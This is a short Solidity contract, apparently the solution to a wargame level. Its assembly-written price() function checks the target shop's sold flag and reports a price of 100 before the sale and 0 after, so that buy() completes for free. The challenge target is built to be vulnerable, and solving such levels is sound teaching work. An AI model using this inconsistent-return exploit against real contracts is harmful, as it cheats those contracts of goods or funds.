pragma solidity ^0.7.0;

interface Shop {
    function buy() external;
}

contract BuyerSolve {
    
    Shop public shop;
    
    constructor(address shopAddr)  {
        shop = Shop(shopAddr);
    }
    
    function price() external view returns (uint) {
         assembly {
        mstore(0x100, 0xe852e741)
        mstore(0x120, 0x0)
        let result := staticcall(gas(), sload(0x0), 0x11c, 0x4, 0x120, 0x20)
        if iszero(mload(0x120)) {
           mstore(0x150, 0x64)
           return(0x150, 0x20) 
        }
        mstore(0x150, 0x0)
        return(0x150, 0x20) 
    }
    }
    
    function call() public {
        shop.buy();
    }
}